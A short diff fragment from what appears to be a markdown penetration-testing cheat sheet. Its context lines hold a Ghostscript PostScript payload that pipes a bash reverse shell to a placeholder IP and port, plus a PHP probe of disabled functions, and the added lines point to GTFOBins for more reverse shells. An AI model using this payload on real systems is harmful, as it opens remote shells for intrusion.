@@ -43,4 +43,6 @@ mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1') currentd
 ```php
 <?php var_dump(explode('.'.ini_get('disable_functions')));?>
 ```
-     
+   
+## This is where you can get more reverse shell
+***https://gtfobins.github.io***
